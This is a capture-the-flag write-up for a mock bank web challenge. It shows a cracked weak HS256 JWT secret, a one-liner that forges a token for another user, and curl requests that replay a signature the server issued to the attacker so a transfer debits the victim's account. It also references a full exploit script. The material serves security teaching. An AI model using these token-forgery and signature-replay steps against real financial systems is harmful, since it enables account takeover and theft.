# Writeup: CAPY-CAPY Bank 2

## Flag

`KubSTU{p0dm3n4_p4r4m3tr0v_1zm3n1l4_summu_tr4nz4kts11}`

(*"подмена параметров изменила сумму транзакции"* — parameter tampering
changed the transaction amount.)

## What changed since Bank 1

The dev team patched the `pending_signatures`-in-`session` cookie hole from
[Bank 1](../24-capy-capy-bank-1/writeup.md): now there is no `session` cookie
involved at all on `/api/get_signature` or `/transfer` — pending signatures
live server-side, and the JS sends *only* `pin_code` to `/api/get_signature`.
JWT secret is rotated to **`ifeveryonecared3`** (still HS256, still in
rockyou).

What they DIDN'T fix: **the issued signature isn't bound to either the user
or the transaction details.** Step 2 (`/api/get_signature`) only takes
`pin_code` and stores `signature` server-side as "valid for some transfer";
step 3 (`/transfer`) accepts the signature regardless of which JWT presents
it and regardless of which `to_account` / `amount` / `description` it
arrives with. Combined with the still-trivial JWT secret, you can:

1. Authenticate as **yourself**, call `/api/get_signature` with **your**
   PIN → `(timestamp, signature)`.
2. Forge a JWT for `mgalankov@4274` (`sub:"4"`) with the cracked secret.
3. POST `/transfer` with **arbitrary** `to_account` / `amount` /
   `description` + the freshly-issued signature → debits Mikhail's account.

Confirmed: receipt #13420 shows `ACC004` (Mikhail) → `ACC100`, 10 ₽,
signature `3b0f42d5b15a6e32` — the same signature `/api/get_signature`
just handed to our `osidorov` account.

## Crack the JWT secret

Same recipe as Bank 1, just longer wordlist position:

```sh
echo "$JWT" > /tmp/jwt.hash
john --format=HMAC-SHA256 --wordlist=/tmp/rockyou.txt /tmp/jwt.hash
john --show /tmp/jwt.hash
# ?:ifeveryonecared3
```

(There is no Flask `session` cookie to crack on Bank 2 — the team moved
`pending_signatures` to a server-side store but, importantly, it stays
keyed by *signature alone*, not by user.)

## Drain Mikhail without his PIN

```sh
# 1) our own PIN, our own JWT — get a (timestamp, signature) pair
curl -sS -b $JAR -X POST "$BASE/api/get_signature" \
     -H 'Content-Type: application/json' \
     --data '{"pin_code":"87654321"}'
# {"date":"2026-05-02","signature":"9e5aa950c1105e02","time":"19:06:22","timestamp":1777748782}

# 2) forge mgalankov JWT
TOK=$(python3 -c 'import jwt,time;print(jwt.encode({"fresh":False,"sub":"4","username":"mgalankov@4274","type":"access","iat":int(time.time()),"nbf":int(time.time())-10,"exp":int(time.time())+3600,"jti":"x"},"ifeveryonecared3",algorithm="HS256"))')

# 3) send the transfer with whatever to_account/amount/description we want
curl -sS -b $JAR_WITH_FORGED_JWT -X POST "$BASE/transfer" \
     --data-urlencode 'to_account=FLAG_SHOP'   \
     --data-urlencode 'amount=1000.0'          \
     --data-urlencode 'description=Покупка: Флаг от CTF задания' \
     --data-urlencode 'product_id=1'           \
     --data-urlencode "token=$OFFER_TOKEN"     \
     --data-urlencode "transaction_date=$DATE" \
     --data-urlencode "transaction_time=$TIME" \
     --data-urlencode "transaction_timestamp=$TS" \
     --data-urlencode "transaction_signature=$SIG"
```

Server flashes `Покупка подтверждена! Флаг отправлен в Telegram бот.`,
new bot is **`@flagi_and_bagi_for_kubstu2bot`** (note the `2`); `/purchases`
DMs the flag.

## Story → bug mapping

The "перевод на тот же магазин, подпись валидна, PIN никто посторонний не
знал" from this week's three new tickets is exactly the parameter-tampering
flow above: the attacker still doesn't know Mikhail's PIN, never touched his
session, and the bank's logs show a signature that **was** issued by the
server — just for a totally different (attacker) account, against a totally
different (1 ₽ smoke-test) transfer. The "adjacent door" the brief mentions
is the missing transaction-data + user-id binding on the signature.

## Files

- [`solution/flag.txt`](flag.txt)
- [`solution/exploit.sh`](exploit.sh) — `./exploit.sh <fresh_offer_token>`
  end-to-end (own login → own PIN → own signature → forged JWT → buy as Mikhail)
- [`solution/artifacts/`](artifacts/) — captured public + authenticated pages
  for offline reproduction
